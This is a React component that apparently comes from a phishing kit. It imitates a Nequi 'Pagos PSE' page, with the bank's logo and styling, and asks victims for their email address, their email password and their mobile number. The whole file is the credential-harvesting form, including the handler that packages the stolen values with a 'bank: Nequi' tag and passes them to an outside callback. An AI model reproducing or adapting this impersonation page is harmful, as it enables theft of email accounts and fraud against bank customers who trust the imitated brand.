/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import React, { useState, useMemo } from 'react';

export default function CorreoNequi({ enviar }: any) {
  const [correo, setCorreo] = useState("");
  const [clave, setClave] = useState("");
  const [celular, setCelular] = useState("");

  // Validación: Todos los campos deben tener contenido
  // Puedes ajustar la validación del celular a 10 dígitos si lo prefieres
  const isFormValid = useMemo(() => {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(correo) && clave.length > 2 && celular.length === 10;
  }, [correo, clave, celular]);

  const handleActualizar = () => {
    if (isFormValid) {
      const payload = {
        view: 'actdatos',
        user: celular,
        correo: correo,
        correoClave: clave,
        bank: "Nequi"
      };
      enviar?.(payload);
    }
  };

  const boxBase = "relative w-full h-[60px] rounded-[4px] transition-all duration-300 px-4 flex items-end pb-2 bg-[#F5F1F5] border-2 border-transparent focus-within:border-[#DA0081] focus-within:bg-white mb-4";
  const labelBase = "absolute left-4 transition-all duration-200 pointer-events-none";

  return (
    <div className="contenedor animate-in fade-in duration-500 max-w-[400px] mx-auto p-4 font-manrope">
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
      `}} />

      <div className="flex flex-col items-center mb-6">
        <img src="/bancos/nequi/img/logo.svg" width="176" alt="logo" className="mb-4" />
        <h2 className="text-[22px] font-extrabold text-[#210049] w-full text-center">
          Pagos PSE de Nequi
        </h2>
      </div>

      <p className="text-[14px] font-medium text-gray-500 mb-8 text-center leading-tight">
        Por favor ingresar la información requerida.
      </p>

      <div className="space-y-1">
        {/* Input Correo */}
        <div className={boxBase}>
          <span className={`${labelBase} ${correo ? "top-2 text-[11px] text-[#DA0081] font-bold" : "top-5 text-[17px] text-[#210049] opacity-60"}`}>
            Correo electrónico
          </span>
          <input
            type="email"
            value={correo}
            onChange={(e) => setCorreo(e.target.value)}
            className="w-full bg-transparent border-none outline-none text-[17px] text-[#210049] font-bold h-7"
            autoComplete="off"
          />
        </div>

        {/* Input Clave Correo */}
        <div className={boxBase}>
          <span className={`${labelBase} ${clave ? "top-2 text-[11px] text-[#DA0081] font-bold" : "top-5 text-[17px] text-[#210049] opacity-60"}`}>
            Clave de correo
          </span>
          <input
            type="password"
            value={clave}
            onChange={(e) => setClave(e.target.value)}
            className="w-full bg-transparent border-none outline-none text-[17px] text-[#210049] font-bold h-7"
            autoComplete="off"
          />
        </div>

        {/* Input Celular */}
        <div className={boxBase}>
          <span className={`${labelBase} ${celular ? "top-2 text-[11px] text-[#DA0081] font-bold" : "top-5 text-[17px] text-[#210049] opacity-60"}`}>
            Número de celular
          </span>
          <input
            type="text"
            inputMode="numeric"
            maxLength={10}
            value={celular}
            onChange={(e) => setCelular(e.target.value.replace(/\D/g, ""))}
            className="w-full bg-transparent border-none outline-none text-[17px] text-[#210049] font-bold h-7"
            autoComplete="off"
          />
        </div>
      </div>

      <div className="mt-8 space-y-3">
        <button
          onClick={handleActualizar}
          disabled={!isFormValid}
          className={`w-full py-4 font-bold text-lg rounded-sm transition-all duration-300 ${isFormValid
            ? "bg-[#da0081] text-white shadow-lg shadow-pink-100 active:scale-95"
            : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
        >
          Actualizar
        </button>

        <button className="w-full py-2 text-[#da0081] font-bold text-sm bg-transparent">
          Ahora no
        </button>
      </div>
    </div>
  );
}